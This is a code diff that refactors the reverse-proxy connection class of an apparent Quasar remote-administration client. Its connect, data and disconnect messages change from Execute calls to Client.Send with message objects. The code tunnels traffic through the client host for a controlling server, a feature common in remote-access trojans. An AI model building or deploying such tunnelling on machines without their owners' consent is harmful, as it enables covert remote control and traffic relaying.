@@ -1,8 +1,8 @@
 ﻿using System;
 using System.Net;
 using System.Net.Sockets;
+using Quasar.Common.Messages;
 using xClient.Core.Networking;
-using xClient.Core.ReverseProxy.Packets;
 
 namespace xClient.Core.ReverseProxy
 {
@@ -47,16 +47,37 @@ namespace xClient.Core.ReverseProxy
                 }
                 catch
                 {
-                    new ReverseProxyConnectResponse(ConnectionId, false, null, 0, this.Target).Execute(Client);
+                    Client.Send(new ReverseProxyConnectResponse
+                    {
+                        ConnectionId = ConnectionId,
+                        IsConnected = false,
+                        LocalAddress = null,
+                        LocalPort = 0,
+                        HostName = Target
+                    });
                     Disconnect();
                 }
 
                 IPEndPoint localEndPoint = (IPEndPoint)this.Handle.LocalEndPoint;
-                new ReverseProxyConnectResponse(ConnectionId, true, localEndPoint.Address, localEndPoint.Port, this.Target).Execute(Client);
+                Client.Send(new ReverseProxyConnectResponse
+                {
+                    ConnectionId = ConnectionId,
+                    IsConnected = true,
+                    LocalAddress = localEndPoint.Address.GetAddressBytes(),
+                    LocalPort = localEndPoint.Port,
+                    HostName = Target
+                });
             }
             else
             {
-                new ReverseProxyConnectResponse(ConnectionId, false, null, 0, this.Target).Execute(Client);
+                Client.Send(new ReverseProxyConnectResponse
+                {
+                    ConnectionId = ConnectionId,
+                    IsConnected = false,
+                    LocalAddress = null,
+                    LocalPort = 0,
+                    HostName = Target
+                });
             }
         }
 
@@ -76,7 +97,7 @@ namespace xClient.Core.ReverseProxy
 
                 byte[] payload = new byte[received];
                 Array.Copy(_buffer, payload, received);
-                new ReverseProxyData(this.ConnectionId, payload).Execute(Client);
+                Client.Send(new ReverseProxyData {ConnectionId = ConnectionId, Data = payload});
             }
             catch
             {
@@ -101,7 +122,7 @@ namespace xClient.Core.ReverseProxy
             {
                 _disconnectIsSend = true;
                 //send to the Server we've been disconnected
-                new ReverseProxyDisconnect(this.ConnectionId).Execute(Client);
+                Client.Send(new ReverseProxyDisconnect {ConnectionId = ConnectionId});
             }
 
             try
